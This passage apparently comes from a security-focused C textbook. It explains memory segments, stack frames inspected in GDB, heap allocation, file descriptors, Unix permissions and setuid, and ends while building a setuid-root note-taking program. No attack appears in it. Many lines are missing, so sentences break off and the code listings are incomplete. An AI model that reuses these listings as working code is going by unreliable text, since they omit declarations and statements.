memory is divided into five segments: text, data, bss,\nheap, and stack. Each segment represents a special portion of memory that is\nThe text segment is also sometimes called the code segment. This is where\nthe assembled machine language instructions of the program are located.\nThe execution of instructions in this segment is nonlinear, thanks to the\naforementioned high-level control structures and functions, which compile\ninto branch, jump, and call instructions in assembly language. As a program\nexecutes, the EIP is set to the first instruction in the text segment. The\nprocessor then follows an execution loop that does the following:\nSometimes the instruction will be a jump or a call instruction, which\nchanges the EIP to a different address of memory. The processor doesn\u2019t\ncare about the change, because it\u2019s expecting the execution to be nonlinear\nanyway. If EIP is changed in step 3, the processor will just go back to step 1\nand read the instruction found at the address of whatever EIP was changed to.\nWrite permission is disabled in the text segment, as it is not used to store\nvariables, only code. This prevents people from actually modifying the pro-\ngram code; any attempt to write to this segment of memory will cause the\nprogram to alert the user that something bad happened, and the program\nwill be killed. Another advantage of this segment being read-only is that it\ncan be shared among different copies of the program, allowing multiple\nexecutions of the program at the same time without any problems. It should\nalso be noted that this memory segment has a fixed size, since nothing ever\nThe data and bss segments are used to store global and static program\nvariables. The data segment is filled with the initialized global and static variables,\nwhile the bss segment is filled with their uninitialized counterparts. Although\nthese segments are writable, they also have a fixed size. Remember that global\nvariables persist, despite the functional context (like the variable j in the\nprevious examples). Both global and static variables are able to persist\nbecause they are stored in their own memory segments.\nThe heap segment is a segment of memory a programmer can directly\ncontrol. Blocks of memory in this segment can be allocated and used for\nwhatever the programmer might need. One notable point about the heap\nsegment is that it isn\u2019t of fixed size, so it can grow larger or smaller as needed.\nAll of the memory within the heap is managed by allocator and deallocator\nalgorithms, which respectively reserve a region of memory in the heap for\nuse and remove reservations to allow that portion of memory to be reused\nfor later reservations. The heap will grow and shrink depending on how\nmuch memory is reserved for use. This means a programmer using the heap\nallocation functions can reserve and free memory on the fly. The growth of\nthe heap moves downward toward higher memory addresses.\nThe stack segment also has variable size and is used as a temporary scratch\npad to store local function variables and context during function calls. This is\nwhat GDB\u2019s backtrace command looks at. When a program calls a function,\nthat function will have its own set of passed variables, and the function\u2019s code\nwill be at a different memory location in the text (or code) segment. Since\nthe context and the EIP must change when a function is called, the stack is\nused to remember all of the passed variables, the location the EIP should\nreturn to after the function is finished, and all the local variables used by\nthat function. All of this information is stored together on the stack in what is\ncollectively called a stack frame. The stack contains many stack frames.\nIn general computer science terms, a stack is an abstract data structure\nthat is used frequently. It has first-in, last-out (FILO) ordering, which means the\nfirst item that is put into a stack is the last item to come out of it. Think of it\nas putting beads on a piece of string that has a knot on one end\u2014you can\u2019t\nget the first bead off until you have removed all the other beads. When an\nitem is placed into a stack, it\u2019s known as pushing, and when an item is removed\nAs the name implies, the stack segment of memory is, in fact, a stack data\nstructure, which contains stack frames. The ESP register is used to keep track\nof the address of the end of the stack, which is constantly changing as items\nare pushed into and popped off of it. Since this is very dynamic behavior, it\nmakes sense that the stack is also not of a fixed size. Opposite to the dynamic\ngrowth of the heap, as the stack changes in size, it grows upward in a visual\nThe FILO nature of a stack might seem odd, but since the stack is used\nto store context, it\u2019s very useful. When a function is called, several things are\npushed to the stack together in a stack frame. The EBP register\u2014sometimes\ncalled the frame pointer (FP) or local base (LB) pointer\u2014is used to reference local\nfunction variables in the current stack frame. Each stack frame contains the\nparameters to the function, its local variables, and two pointers that are nec-\nessary to put things back the way they were: the saved frame pointer (SFP) and\nthe return address. The SFP is used to restore EBP to its previous value, and the\nreturn address is used to restore EIP to the next instruction found after the\nfunction call. This restores the functional context of the previous stack\nThe following stack_example.c code has two functions: main() and\nThis program first declares a test function that has four arguments, which\nare all declared as integers: a, b, c, and d. The local variables for the function\ninclude a single character called flag and a 10-character buffer called buffer.\nThe memory for these variables is in the stack segment, while the machine\ninstructions for the function\u2019s code is stored in the text segment. After\ncompiling the program, its inner workings can be examined with GDB. The\nfollowing output shows the disassembled machine instructions for main() and\ntest_function(). The main() function starts at 0x08048357 and test_function()\nstarts at 0x08048344. The first few instructions of each function (shown in\nbold below) set up the stack frame. These instructions are collectively called\nthe procedure prologue or function prologue. They save the frame pointer on the\nstack, and they save stack memory for the local function variables. Sometimes\nthe function prologue will handle some stack alignment as well. The exact\nprologue instructions will vary greatly depending on the compiler and\ncompiler options, but in general these instructions build the stack frame.\nUsing host libthread_db library \"/lib/tls/i686/cmov/libthread_db.so.1\".\n0x08048367 <main+16>:   mov    DWORD PTR [esp+12],0x4\n0x0804836f <main+24>:   mov    DWORD PTR [esp+8],0x3\n0x08048377 <main+32>:   mov    DWORD PTR [esp+4],0x2\n0x08048386 <main+47>:   call   0x8048344 <test_function>\n0x0804834a <test_function+6>:   mov    DWORD PTR [ebp-12],0x7a69\n0x08048351 <test_function+13>:  mov    BYTE PTR [ebp-40],0x41\nWhen the program is run, the main() function is called, which simply calls\nWhen the test_function() is called from the main() function, the various\nvalues are pushed to the stack to create the start of the stack frame as follows.\nWhen test_function() is called, the function arguments are pushed onto the\nstack in reverse order (since it\u2019s FILO). The arguments for the function are\n1, 2, 3, and 4, so the subsequent push instructions push 4, 3, 2, and finally 1\nonto the stack. These values correspond to the variables d, c, b, and a in the\nfunction. The instructions that put these values on the stack are shown in\n0x08048367 <main+16>:   mov    DWORD PTR [esp+12],0x4\n0x0804836f <main+24>:   mov    DWORD PTR [esp+8],0x3\n0x08048377 <main+32>:   mov    DWORD PTR [esp+4],0x2\n0x08048386 <main+47>:   call   0x8048344 <test_function>\nNext, when the assembly call instruction is executed, the return\naddress is pushed onto the stack and the execution flow jumps to the start of\ntest_function() at 0x08048344. The return address value will be the location\nof the instruction following the current EIP\u2014specifically, the value stored\nduring step 3 of the previously mentioned execution loop. In this case, the\nreturn address would point to the leave instruction in main() at 0x0804838b.\nThe call instruction both stores the return address on the stack and jumps\nEIP to the beginning of test_function(), so test_function()\u2019s procedure pro-\nlogue instructions finish building the stack frame. In this step, the current\nvalue of EBP is pushed to the stack. This value is called the saved frame\npointer (SFP) and is later used to restore EBP back to its original state.\nThe current value of ESP is then copied into EBP to set the new frame pointer.\nThis frame pointer is used to reference the local variables of the function\n(flag and buffer). Memory is saved for these variables by subtracting from\nESP. In the end, the stack frame looks something like this:\nWe can watch the stack frame construction on the stack using GDB. In the\nfollowing output, a breakpoint is set in main() before the call to test_function()\nand also at the beginning of test_function(). GDB will put the first break-\npoint before the function arguments are pushed to the stack, and the second\nbreakpoint after test_function()\u2019s procedure prologue. When the program is\nrun, execution stops at the breakpoint, where the register\u2019s ESP (stack pointer),\nEBP (frame pointer), and EIP (execution pointer) are examined.\nBreakpoint 1 at 0x8048367: file stack_example.c, line 10.\nBreakpoint 2 at 0x804834a: file stack_example.c, line 5.\neip            0x8048367        0x8048367 <main+16>\n0x8048367 <main+16>:    mov    DWORD PTR [esp+12],0x4\n0x804836f <main+24>:    mov    DWORD PTR [esp+8],0x3\n0x8048377 <main+32>:    mov    DWORD PTR [esp+4],0x2\n0x8048386 <main+47>:    call   0x8048344 <test_function>\nThis breakpoint is right before the stack frame for the test_function() call\nis created. This means the bottom of this new stack frame is at the current\nvalue of ESP, 0xbffff7f0. The next breakpoint is right after the procedure\nprologue for test_function(), so continuing will build the stack frame. The\noutput below shows similar information at the second breakpoint. The local\nvariables (flag and buffer) are referenced relative to the frame pointer (EBP).\nBreakpoint 2, test_function (a=1, b=2, c=3, d=4) at stack_example.c:5\neip            0x804834a        0x804834a <test_function+6>\n0x0804834a <test_function+6>:   mov    DWORD PTR [ebp-12],0x7a69\n0x08048351 <test_function+13>:  mov    BYTE PTR [ebp-40],0x41\n\u00000x00000000      0x08049548      0xbffff7d8      0x08048249\n0xbffff7d0:     0xb7f9f729      0xb7fd6ff4      0xbffff808      0x080483b9\n\u00050x00000001      0x00000002      0x00000003      0x00000004\nThe stack frame is shown on the stack at the end. The four arguments to\nthe function can be seen at the bottom of the stack frame (\u0000), with the return\naddress found directly on top (\u0002). Above that is the saved frame pointer of\n0xbffff808 (\u0003), which is what EBP was in the previous stack frame. The rest of\nthe memory is saved for the local stack variables: flag and buffer. Calculat-\ning their relative addresses to EBP show their exact locations in the stack\nframe. Memory for the flag variable is shown at \u0004 and memory for the\nbuffer variable is shown at \u0005. The extra space in the stack frame is just\nAfter the execution finishes, the entire stack frame is popped off of the\nstack, and the EIP is set to the return address so the program can continue\nexecution. If another function was called within the function, another stack\nframe would be pushed onto the stack, and so on. As each function ends, its\nstack frame is popped off of the stack so execution can be returned to the\nprevious function. This behavior is the reason this segment of memory is\nThe various segments of memory are arranged in the order they\nwere presented, from the lower memory addresses to the higher memory\naddresses. Since most people are familiar with seeing numbered lists that\ncount downward, the smaller memory addresses are shown at the top.\nSome texts have this reversed, which can be very confusing; so for this\nIn C, as in other compiled languages, the compiled code goes into the text\nsegment, while the variables reside in the remaining segments. Exactly which\nmemory segment a variable will be stored in depends on how the variable is\ndefined. Variables that are defined outside of any functions are considered\nto be global. The static keyword can also be prepended to any variable\ndeclaration to make the variable static. If static or global variables are initial-\nized with data, they are stored in the data memory segment; otherwise, these\nvariables are put in the bss memory segment. Memory on the heap memory\nsegment must first be allocated using a memory allocation function called\nmalloc(). Usually, pointers are used to reference memory on the heap.\nFinally, the remaining function variables are stored in the stack memory\nsegment. Since the stack can contain many different stack frames, stack\nvariables can maintain uniqueness within different functional contexts.\nThe memory_segments.c program will help explain these concepts in C.\nvoid function() {  // This is just a demo function.\nint stack_var; // Notice this variable has the same name as the one in main().\nprintf(\"the function's stack_var is at address 0x%08x\\n\", &stack_var);\nint stack_var; // Same name as the variable in function()\nprintf(\"global_initialized_var is at address 0x%08x\\n\", &global_initialized_var);\nprintf(\"static_initialized_var is at address 0x%08x\\n\\n\", &static_initialized_var);\nprintf(\"static_var is at address 0x%08x\\n\", &static_var);\nprintf(\"global_var is at address 0x%08x\\n\\n\", &global_var);\nprintf(\"heap_var is at address 0x%08x\\n\\n\", heap_var_ptr);\nprintf(\"stack_var is at address 0x%08x\\n\", &stack_var);\nMost of this code is fairly self-explanatory because of the descriptive\nvariable names. The global and static variables are declared as described\nearlier, and initialized counterparts are also declared. The stack variable is\ndeclared both in main() and in function() to showcase the effect of functional\ncontexts. The heap variable is actually declared as an integer pointer, which\nwill point to memory allocated on the heap memory segment. The malloc()\nfunction is called to allocate four bytes on the heap. Since the newly allocated\nmemory could be of any data type, the malloc() function returns a void\npointer, which needs to be typecast into an integer pointer.\nThe first two initialized variables have the lowest memory addresses,\nsince they are located in the data memory segment. The next two variables,\nstatic_var and global_var, are stored in the bss memory segment, since they\naren\u2019t initialized. These memory addresses are slightly larger than the previous\nvariables\u2019 addresses, since the bss segment is located below the data segment.\nSince both of these memory segments have a fixed size after compilation,\nthere is little wasted space, and the addresses aren\u2019t very far apart.\nThe heap variable is stored in space allocated on the heap segment,\nwhich is located just below the bss segment. Remember that memory in this\nsegment isn\u2019t fixed, and more space can be dynamically allocated later. Finally,\nthe last two stack_vars have very large memory addresses, since they are located\nin the stack segment. Memory in the stack isn\u2019t fixed, either; however, this\nmemory starts at the bottom and grows backward toward the heap segment.\nThis allows both memory segments to be dynamic without wasting space in\nmemory. The first stack_var in the main() function\u2019s context is stored in the\nstack segment within a stack frame. The second stack_var in function() has its\nown unique context, so that variable is stored within a different stack frame\nin the stack segment. When function() is called near the end of the program,\na new stack frame is created to store (among other things) the stack_var for\nfunction()\u2019s context. Since the stack grows back up toward the heap segment\nwith each new stack frame, the memory address for the second stack_var\n(0xbffff814) is smaller than the address for the first stack_var (0xbffff834)\nUsing the other memory segments is simply a matter of how you declare\nvariables. However, using the heap requires a bit more effort. As previously\ndemonstrated, allocating memory on the heap is done using the malloc()\nfunction. This function accepts a size as its only argument and reserves that\nmuch space in the heap segment, returning the address to the start of this\nmemory as a void pointer. If the malloc() function can\u2019t allocate memory\nfor some reason, it will simply return a NULL pointer with a value of 0.\nThe corresponding deallocation function is free(). This function accepts a\npointer as its only argument and frees that memory space on the heap so it\ncan be used again later. These relatively simple functions are demonstrated\nif (argc < 2)     // If there aren't command-line arguments,\nprintf(\"\\t[+] allocating %d bytes of memory on the heap for char_ptr\\n\", mem_size);\nchar_ptr = (char *) malloc(mem_size); // Allocating heap memory\nif(char_ptr == NULL) {  // Error checking, in case malloc() fails\nfprintf(stderr, \"Error: could not allocate heap memory.\\n\");\nstrcpy(char_ptr, \"This is memory is located on the heap.\");\nprintf(\"char_ptr (%p) --> '%s'\\n\", char_ptr, char_ptr);\nprintf(\"\\t[+] allocating 12 bytes of memory on the heap for int_ptr\\n\");\nint_ptr = (int *) malloc(12); // Allocated heap memory again\nif(int_ptr == NULL) {  // Error checking, in case malloc() fails\nfprintf(stderr, \"Error: could not allocate heap memory.\\n\");\n*int_ptr = 31337; // Put the value of 31337 where int_ptr is pointing.\nprintf(\"int_ptr (%p) --> %d\\n\", int_ptr, *int_ptr);\nprintf(\"\\t[-] freeing char_ptr's heap memory...\\n\");\nprintf(\"\\t[+] allocating another 15 bytes for char_ptr\\n\");\nchar_ptr = (char *) malloc(15); // Allocating more heap memory\nif(char_ptr == NULL) {  // Error checking, in case malloc() fails\nfprintf(stderr, \"Error: could not allocate heap memory.\\n\");\nprintf(\"char_ptr (%p) --> '%s'\\n\", char_ptr, char_ptr);\nprintf(\"\\t[-] freeing int_ptr's heap memory...\\n\");\nprintf(\"\\t[-] freeing char_ptr's heap memory...\\n\");\nfree(char_ptr); // Freeing the other block of heap memory\nThis program accepts a command-line argument for the size of the first\nmemory allocation, with a default value of 50. Then it uses the malloc() and\nfree() functions to allocate and deallocate memory on the heap. There are\nplenty of printf() statements to debug what is actually happening when the\nprogram is executed. Since malloc() doesn\u2019t know what type of memory it\u2019s\nallocating, it returns a void pointer to the newly allocated heap memory,\nwhich must be typecast into the appropriate type. After every malloc() call,\nthere is an error-checking block that checks whether or not the allocation\nfailed. If the allocation fails and the pointer is NULL, fprintf() is used to\nprint an error message to standard error and the program exits. The fprintf()\nfunction is very similar to printf(); however, its first argument is stderr, which\nis a standard filestream meant for displaying errors. This function will be\nexplained more later, but for now, it\u2019s just used as a way to properly display\nan error. The rest of the program is pretty straightforward.\nreader@hacking:~/booksrc $ gcc -o heap_example heap_example.c\n[+] allocating 50 bytes of memory on the heap for char_ptr\nchar_ptr (0x804a008) --> 'This is memory is located on the heap.'\n[+] allocating 12 bytes of memory on the heap for int_ptr\nIn the preceding output, notice that each block of memory has an incre-\nmentally higher memory address in the heap. Even though the first 50 bytes\nwere deallocated, when 15 more bytes are requested, they are put after the\n12 bytes allocated for the int_ptr. The heap allocation functions control this\nbehavior, which can be explored by changing the size of the initial memory\n[+] allocating 100 bytes of memory on the heap for char_ptr\nchar_ptr (0x804a008) --> 'This is memory is located on the heap.'\n[+] allocating 12 bytes of memory on the heap for int_ptr\nIf a larger block of memory is allocated and then deallocated, the final\n15-byte allocation will occur in that freed memory space, instead. By experi-\nmenting with different values, you can figure out exactly when the allocation\nfunction chooses to reclaim freed space for new allocations. Often, simple\ninformative printf() statements and a little experimentation can reveal many\nIn heap_example.c, there were several error checks for the malloc() calls.\nEven though the malloc() calls never failed, it\u2019s important to handle all\npotential cases when coding in C. But with multiple malloc() calls, this error-\nchecking code needs to appear in multiple places. This usually makes the\ncode look sloppy, and it\u2019s inconvenient if changes need to be made to the\nerror-checking code or if new malloc() calls are needed. Since all the error-\nchecking code is basically the same for every malloc() call, this is a perfect\nplace to use a function instead of repeating the same instructions in multiple\nplaces. Take a look at errorchecked_heap.c for an example.\nvoid *errorchecked_malloc(unsigned int); // Function prototype for errorchecked_malloc()\nif (argc < 2)    // If there aren't command-line arguments,\nprintf(\"\\t[+] allocating %d bytes of memory on the heap for char_ptr\\n\", mem_size);\nchar_ptr = (char *) errorchecked_malloc(mem_size); // Allocating heap memory\nstrcpy(char_ptr, \"This is memory is located on the heap.\");\nprintf(\"char_ptr (%p) --> '%s'\\n\", char_ptr, char_ptr);\nprintf(\"\\t[+] allocating 12 bytes of memory on the heap for int_ptr\\n\");\nint_ptr = (int *) errorchecked_malloc(12); // Allocated heap memory again\n*int_ptr = 31337; // Put the value of 31337 where int_ptr is pointing.\nprintf(\"int_ptr (%p) --> %d\\n\", int_ptr, *int_ptr);\nprintf(\"\\t[-] freeing char_ptr's heap memory...\\n\");\nprintf(\"\\t[+] allocating another 15 bytes for char_ptr\\n\");\nchar_ptr = (char *) errorchecked_malloc(15); // Allocating more heap memory\nprintf(\"char_ptr (%p) --> '%s'\\n\", char_ptr, char_ptr);\nprintf(\"\\t[-] freeing int_ptr's heap memory...\\n\");\nprintf(\"\\t[-] freeing char_ptr's heap memory...\\n\");\nfree(char_ptr); // Freeing the other block of heap memory\nvoid *errorchecked_malloc(unsigned int size) { // An error-checked malloc() function\nfprintf(stderr, \"Error: could not allocate heap memory.\\n\");\nThe errorchecked_heap.c program is basically equivalent to the\nprevious heap_example.c code, except the heap memory allocation and\nerror checking has been gathered into a single function. The first line of code\n[void *errorchecked_malloc(unsigned int);] is the function prototype. This lets\nthe compiler know that there will be a function called errorchecked_malloc() that\nexpects a single, unsigned integer argument and returns a void pointer. The\nactual function can then be anywhere; in this case it is after the main() func-\ntion. The function itself is quite simple; it just accepts the size in bytes to\nallocate and attempts to allocate that much memory using malloc(). If the\nallocation fails, the error-checking code displays an error and the program\nexits; otherwise, it returns the pointer to the newly allocated heap memory.\nThis way, the custom errorchecked_malloc() function can be used in place of\na normal malloc(), eliminating the need for repetitious error checking after-\nward. This should begin to highlight the usefulness of programming with\nOnce you understand the basic concepts of C programming, the rest is pretty\neasy. The bulk of the power of C comes from using other functions. In fact,\nif the functions were removed from any of the preceding programs, all that\nThere are two primary ways to access files in C: file descriptors and file-\nstreams. File descriptors use a set of low-level I/O functions, and filestreams are\na higher-level form of buffered I/O that is built on the lower-level functions.\nSome consider the filestream functions easier to program with; however, file\ndescriptors are more direct. In this book, the focus will be on the low-level\nThe bar code on the back of this book represents a number. Because this\nnumber is unique among the other books in a bookstore, the cashier can\nscan the number at checkout and use it to reference information about this\nbook in the store\u2019s database. Similarly, a file descriptor is a number that is\nused to reference open files. Four common functions that use file descriptors\nare open(), close(), read(), and write(). All of these functions will return \u22121 if\nthere is an error. The open() function opens a file for reading and/or writing\nand returns a file descriptor. The returned file descriptor is just an integer\nvalue, but it is unique among open files. The file descriptor is passed as an\nargument to the other functions like a pointer to the opened file. For the\nclose() function, the file descriptor is the only argument. The read() and\nwrite() functions\u2019 arguments are the file descriptor, a pointer to the data to\nread or write, and the number of bytes to read or write from that location.\nThe arguments to the open() function are a pointer to the filename to open\nand a series of predefined flags that specify the access mode. These flags and\ntheir usage will be explained in depth later, but for now let\u2019s take a look at a\nsimple note-taking program that uses file descriptors\u2014simplenote.c. This\nprogram accepts a note as a command-line argument and then adds it to the\nend of the file /tmp/notes. This program uses several functions, including a\nfamiliar looking error-checked heap memory allocation function. Other func-\ntions are used to display a usage message and to handle fatal errors. The\nusage() function is simply defined before main(), so it doesn\u2019t need a function\nprintf(\"Usage: %s <data to add to %s>\\n\", prog_name, filename);\nvoid fatal(char *);            // A function for fatal errors\nvoid *ec_malloc(unsigned int); // An error-checked malloc() wrapper\nif(argc < 2)                 // If there aren't command-line arguments,\nusage(argv[0], datafile); // display usage message and exit.\nprintf(\"[DEBUG] buffer   @ %p: \\'%s\\'\\n\", buffer, buffer);\nprintf(\"[DEBUG] datafile @ %p: \\'%s\\'\\n\", datafile, datafile);\nstrncat(buffer, \"\\n\", 1); // Add a newline on the end.\nfd = open(datafile, O_WRONLY|O_CREAT|O_APPEND, S_IRUSR|S_IWUSR);\n// A function to display an error message and then exit\nBesides the strange-looking flags used in the open() function, most of this\ncode should be readable. There are also a few standard functions that we\nhaven\u2019t used before. The strlen() function accepts a string and returns its\nlength. It\u2019s used in combination with the write() function, since it needs to\nknow how many bytes to write. The perror() function is short for print error and is\nused in fatal() to print an additional error message (if it exists) before exiting.\nreader@hacking:~/booksrc $ gcc -o simplenote simplenote.c\nreader@hacking:~/booksrc $ ./simplenote \"this is a test note\"\n[DEBUG] buffer   @ 0x804a008: 'this is a test note'\nreader@hacking:~/booksrc $ ./simplenote \"great, it works\"\nThe output of the program\u2019s execution is pretty self-explanatory, but\nthere are some things about the source code that need further explanation.\nThe files fcntl.h and sys/stat.h had to be included, since those files define the\nflags used with the open() function. The first set of flags is found in fcntl.h\nand is used to set the access mode. The access mode must use at least one of\nThese flags can be combined with several other optional flags using the\nbitwise OR operator. A few of the more common and useful of these flags are\nBitwise operations combine bits using standard logic gates such as OR and\nAND. When two bits enter an OR gate, the result is 1 if either the first bit or the\nsecond bit is 1. If two bits enter an AND gate, the result is 1 only if both the first\nbit and the second bit are 1. Full 32-bit values can use these bitwise operators to\nperform logic operations on each corresponding bit. The source code of\nbitwise.c and the program output demonstrate these bitwise operations.\nIf the file already exists, truncate the file to 0 length.\nprintf(\"%d | %d = %d\\n\", bit_a, bit_b, bit_a | bit_b);\nprintf(\"%d & %d = %d\\n\", bit_a, bit_b, bit_a & bit_b);\nThe results of compiling and executing bitwise.c are as follows.\nThe flags used for the open() function have values that correspond to\nsingle bits. This way, flags can be combined using OR logic without destroy-\ning any information. The fcntl_flags.c program and its output explore some\nof the flag values defined by fcntl.h and how they combine with each other.\ndisplay_flags(\"O_WRONLY|O_APPEND|O_CREAT\", O_WRONLY|O_APPEND|O_CREAT);\nvoid display_flags(char *label, unsigned int value) {\nunsigned int mask = 0xff000000; // Start with a mask for the highest byte.\nunsigned int shift = 256*256*256; // Start with a shift for the highest byte.\nfor(byte_iterator=0; byte_iterator < 4; byte_iterator++) {\nbyte = (value & mask) / shift; // Isolate each byte.\nfor(bit_iterator=0; bit_iterator < 8; bit_iterator++) { // Print the byte's bits.\nif(byte & 0x80) // If the highest bit in the byte isn't 0,\nbyte *= 2;         // Move all the bits to the left by 1.\nmask /= 256;       // Move the bits in mask right by 8.\nshift /= 256;      // Move the bits in shift right by 8.\nThe results of compiling and executing fcntl_flags.c are as follows.\nO_RDONLY                        : 0     : 00000000 00000000 00000000 00000000\nO_WRONLY                        : 1     : 00000000 00000000 00000000 00000001\nO_RDWR                          : 2     : 00000000 00000000 00000000 00000010\nO_APPEND                        : 1024  : 00000000 00000000 00000100 00000000\nO_TRUNC                         : 512   : 00000000 00000000 00000010 00000000\nO_CREAT                         : 64    : 00000000 00000000 00000000 01000000\nO_WRONLY|O_APPEND|O_CREAT       : 1089  : 00000000 00000000 00000100 01000001\nUsing bit flags in combination with bitwise logic is an efficient and com-\nmonly used technique. As long as each flag is a number that only has unique\nbits turned on, the effect of doing a bitwise OR on these values is the same as\nadding them. In fcntl_flags.c, 1 + 1024 + 64 = 1089. This technique only works\nIf the O_CREAT flag is used in access mode for the open() function, an additional\nargument is needed to define the file permissions of the newly created file.\nThis argument uses bit flags defined in sys/stat.h, which can be combined\nGive the file read permission for the user (owner).\nGive the file write permission for the user (owner).\nGive the file execute permission for the user (owner).\nGive the file execute permission for other (anyone).\nIf you are already familiar with Unix file permissions, those flags should\nmake perfect sense to you. If they don\u2019t make sense, here\u2019s a crash course in\nEvery file has an owner and a group. These values can be displayed using\nreader@hacking:~/booksrc $ ls -l /etc/passwd simplenote*\n-rw-r--r-- 1 root   root   1424 2007-09-06 09:45 /etc/passwd\n-rwxr-xr-x 1 reader reader 8457 2007-09-07 02:51 simplenote\n-rw------- 1 reader reader 1872 2007-09-07 02:51 simplenote.c\nFor the /etc/passwd file, the owner is root and the group is also root. For\nthe other two simplenote files, the owner is reader and the group is users.\nRead, write, and execute permissions can be turned on and off for three\ndifferent fields: user, group, and other. User permissions describe what the\nowner of the file can do (read, write, and/or execute), group permissions\ndescribe what users in that group can do, and other permissions describe\nwhat everyone else can do. These fields are also displayed in the front of the\nls -l output. First, the user read/write/execute permissions are displayed,\nusing r for read, w for write, x for execute, and - for off. The next three\ncharacters display the group permissions, and the last three characters are\nfor the other permissions. In the output above, the simplenote program has\nall three user permissions turned on (shown in bold). Each permission cor-\nresponds to a bit flag; read is 4 (100 in binary), write is 2 (010 in binary), and\nexecute is 1 (001 in binary). Since each value only contains unique bits,\na bitwise OR operation achieves the same result as adding these numbers\ntogether does. These values can be added together to define permissions for\n-rwx-wx--x 1 reader reader 1826 2007-09-07 02:51 simplenote.c\nreader@hacking:~/booksrc $ chmod ugo-wx simplenote.c\n-r-------- 1 reader reader 1826 2007-09-07 02:51 simplenote.c\n-rw------- 1 reader reader 1826 2007-09-07 02:51 simplenote.c\nThe first command (chmod 721) gives read, write, and execute permissions to\nthe user, since the first number is 7 (4 + 2 + 1), write and execute permissions\nto group, since the second number is 3 (2 + 1), and only execute permis-\nsion to other, since the third number is 1. Permissions can also be added or\nsubtracted using chmod. In the next chmod command, the argument ugo-wx\nmeans Subtract write and execute permissions from user, group, and other. The final\nIn the simplenote program, the open() function uses S_IRUSR|S_IWUSR for\nits additional permission argument, which means the /tmp/notes file should\nonly have user read and write permission when it is created.\n-rw------- 1 reader reader 36 2007-09-07 02:52 /tmp/notes\nEvery user on a Unix system has a unique user ID number. This user ID can\ngroups=999(reader),4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),4\n4(video),46(plugdev),104(scanner),112(netdev),113(lpadmin),115(powerdev),117(a\nThe root user with user ID 0 is like the administrator account, which has\nfull access to the system. The su command can be used to switch to a differ-\nent user, and if this command is run as root, it can be done without a pass-\nword. The sudo command allows a single command to be run as the root user.\nOn the LiveCD, sudo has been configured so it can be executed without a pass-\nword, for simplicity\u2019s sake. These commands provide a simple method to\nAs the user jose, the simplenote program will run as jose if it is executed,\nbut it won\u2019t have access to the /tmp/notes file. This file is owned by the user\nreader, and it only allows read and write permission to its owner.\njose@hacking:/home/reader/booksrc $ ls -l /tmp/notes\n-rw------- 1 reader reader 36 2007-09-07 05:20 /tmp/notes\njose@hacking:/home/reader/booksrc $ ./simplenote \"a note for jose\"\n[!!] Fatal Error in main() while opening file: Permission denied\nThis is fine if reader is the only user of the simplenote program; however,\nthere are many times when multiple users need to be able to access certain\nportions of the same file. For example, the /etc/passwd file contains account\ninformation for every user on the system, including each user\u2019s default login\nshell. The command chsh allows any user to change his or her own login shell.\nThis program needs to be able to make changes to the /etc/passwd file, but\nonly on the line that pertains to the current user\u2019s account. The solution to\nthis problem in Unix is the set user ID (setuid) permission. This is an addi-\ntional file permission bit that can be set using chmod. When a program with\nthis flag is executed, it runs as the user ID of the file\u2019s owner.\nreader@hacking:~/booksrc $ ls -l /usr/bin/chsh /etc/passwd\n-rw-r--r-- 1 root root  1424 2007-09-06 21:05 /etc/passwd\n-rwsr-xr-x 1 root root 23920 2006-12-19 20:35 /usr/bin/chsh\nThe chsh program has the setuid flag set, which is indicated by an s in the\nls output above. Since this file is owned by root and has the setuid permission\nset, the program will run as the root user when any user runs this program.\nThe /etc/passwd file that chsh writes to is also owned by root and only allows\nthe owner to write to it. The program logic in chsh is designed to only allow\nwriting to the line in /etc/passwd that corresponds to the user running the\nprogram, even though the program is effectively running as root. This\nmeans that a running program has both a real user ID and an effective user\nID. These IDs can be retrieved using the functions getuid() and geteuid(),\nThe results of compiling and executing uid_demo.c are as follows.\nreader@hacking:~/booksrc $ gcc -o uid_demo uid_demo.c\n-rwxr-xr-x 1 reader reader 6825 2007-09-07 05:32 uid_demo\nreader@hacking:~/booksrc $ sudo chown root:root ./uid_demo\n-rwxr-xr-x 1 root root 6825 2007-09-07 05:32 uid_demo\nIn the output for uid_demo.c, both user IDs are shown to be 999 when\nuid_demo is executed, since 999 is the user ID for reader. Next, the sudo com-\nmand is used with the chown command to change the owner and group of\nuid_demo to root. The program can still be executed, since it has execute\npermission for other, and it shows that both user IDs remain 999, since\nchmod: changing permissions of `./uid_demo': Operation not permitted\nreader@hacking:~/booksrc $ sudo chmod u+s ./uid_demo\n-rwsr-xr-x 1 root root 6825 2007-09-07 05:32 uid_demo\nSince the program is owned by root now, sudo must be used to change\nfile permissions on it. The chmod u+s command turns on the setuid permis-\nsion, which can be seen in the following ls -l output. Now when the user\nreader executes uid_demo, the effective user ID is 0 for root, which means the\nprogram can access files as root. This is how the chsh program is able to allow\nany user to change his or her login shell stored in /etc/passwd.\nThis same technique can be used in a multiuser note-taking program.\nThe next program will be a modification of the simplenote program; it will\nalso record the user ID of each note\u2019s original author. In addition, a new\nThe ec_malloc() and fatal() functions have been useful in many of our\nprograms. Rather than copy and paste these functions into each program,\n// A function to display an error message and then exit\nIn this new program, hacking.h, the functions can just be included. In C,\nwhen the filename for a #include is surrounded by < and >, the compiler looks\nfor this file in standard include paths, such as /usr/include/. If the filename\nis surrounded by quotes, the compiler looks in the current directory. There-\nfore, if hacking.h is in the same directory as a program, it can be included\nThe changed lines for the new notetaker program (notetaker.c) are\nprintf(\"Usage: %s <data to add to %s>\\n\", prog_name, filename);\nvoid fatal(char *);            // A function for fatal errors\nvoid *ec_malloc(unsigned int); // An error-checked malloc() wrapper\nif(argc < 2)                // If there aren't command-line arguments,\nusage(argv[0], datafile); // display usage message and exit.\nprintf(\"[DEBUG] buffer   @ %p: \\'%s\\'\\n\", buffer, buffer);\nprintf(\"[DEBUG] datafile @ %p: \\'%s\\'\\n\", datafile, datafile);\nfd = open(datafile, O_WRONLY|O_CREAT|O_APPEND, S_IRUSR|S_IWUSR);\nif(write(fd, &userid, 4) == -1) // Write user ID before note data.\nif(write(fd, buffer, strlen(buffer)) == -1) // Write note.\nThe output file has been changed from /tmp/notes to /var/notes, so the\ndata is now stored in a more permanent place. The getuid() function is used to\nget the real user ID, which is written to the datafile on the line before the note\u2019s\nline is written. Since the write() function is expecting a pointer for its source,\nthe & operator is used on the integer value userid to provide its address.\nreader@hacking:~/booksrc $ gcc -o notetaker notetaker.c\nreader@hacking:~/booksrc $ sudo chown root:root ./notetaker\nreader@hacking:~/booksrc $ sudo chmod u+s ./notetaker\n-rwsr-xr-x 1 